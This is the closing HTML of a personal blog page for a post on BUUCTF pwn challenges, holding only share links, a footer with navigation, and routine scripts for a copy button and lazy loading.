  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;name=buuctf之pwn题(持续更新)&amp;description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/02/22/buuctf%E4%B9%8Bpwn%E9%A2%98-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/&amp;t=buuctf之pwn题(持续更新)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright ©
    
    
    2021-2023
    z1r0
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/z1r00?tab=repositories">Projects</a></li><!--
     --><!--
       --><li><a href="/links/">links</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->



<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>